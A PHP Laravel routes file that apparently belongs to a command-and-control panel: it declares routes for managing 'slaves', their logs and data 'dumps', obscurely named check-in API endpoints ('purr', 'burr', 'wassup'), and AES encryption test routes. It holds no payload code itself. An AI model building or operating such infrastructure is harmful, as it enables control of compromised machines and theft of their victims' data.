<?php

Route::get('/',             ['as' => 'landing',         'uses' => 'LandingController@welcome']);
Route::get('login',         ['as' => 'login',           'uses' => 'LandingController@login']);
Route::post('login',        ['as' => 'login.post',      'uses' => 'LandingController@postLogin']);
Route::get('register',      ['as' => 'register',        'uses' => 'LandingController@register']);
Route::post('register',     ['as' => 'register.post',   'uses' => 'LandingController@postRegister']);

Route::group(['prefix' => 'command'], function(){
    Route::get('/',                     ['as' => 'command.dashboard',   'uses' => 'CommandController@dashboard']);
    Route::get('slaves',                ['as' => 'command.slaves',      'uses' => 'CommandController@slaves']);
    Route::get('slaves/{id}',           ['as' => 'command.slave',       'uses' => 'CommandController@slave']);
    Route::get('slaves/{id}/logs',      ['as' => 'command.slave.logs',  'uses' => 'CommandController@slaveLogs']);
    Route::get('slaves/{id}/dumps',     ['as' => 'command.slave.dumps', 'uses' => 'CommandController@slaveDumps']);
    Route::get('dumps',                 ['as' => 'command.dumps',       'uses' => 'CommandController@dumps']);
    Route::get('dump/{id}',             ['as' => 'command.dump',        'uses' => 'CommandController@dump']);
    Route::get('logs',                  ['as' => 'command.logs',        'uses' => 'CommandController@logs']);
    Route::get('log/{id}',              ['as' => 'command.log',         'uses' => 'CommandController@log']);
    Route::get('view/{what}/{id}',      ['as' => 'command.view',        'uses' => 'CommandController@view']);
    Route::post('view/{what}/{id}',     ['as' => 'command.view.post',   'uses' => 'CommandController@postView']);
});

Route::group(['prefix' => 'api'], function(){
    Route::post('purr',         ['as' => 'api.purr',    'uses' => 'ApiController@purr']);
    Route::post('burr',         ['as' => 'api.burr',    'uses' => 'ApiController@burr']);
    Route::get('wassup/{i}',    ['as' => 'api.wassup',  'uses' => 'ApiController@wassup']);
});

Route::get('test',      ['as' => 'api.test',            'uses' => 'ApiController@test']);
Route::post('test',     ['as' => 'api.test.post',       'uses' => 'ApiController@postTest']);
Route::get('test-aes',  ['as' => 'api.test.aes',        'uses' => 'ApiController@testAES']);
Route::post('test-aes', ['as' => 'api.test.aes.post',   'uses' => 'ApiController@postTestAES']);
Route::get('test-encryption', ['as' => 'api.test.encryption', 'uses' => 'ApiController@testEncryption']);
Route::post('test-encryption', ['as' => 'api.test.encryption.post', 'uses' => 'ApiController@postTestEncryption']);
